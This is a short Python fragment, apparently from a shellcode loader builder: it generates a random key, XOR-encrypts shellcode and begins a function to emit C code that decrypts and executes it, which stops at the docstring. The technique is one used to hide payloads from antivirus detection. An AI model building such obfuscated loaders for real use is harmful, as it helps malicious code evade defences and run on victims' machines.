def generate_key(length=8):
    """Generate a random key for XOR encryption."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def xor_encrypt(data, key):
    """Encrypt shellcode with XOR using the provided key."""
    encrypted = bytearray()
    for i in range(len(data)):
        encrypted.append(data[i] ^ ord(key[i % len(key)]))
    return encrypted

def generate_c_code(shellcode, key):
    """Generate C code for the XOR decryption and execution."""
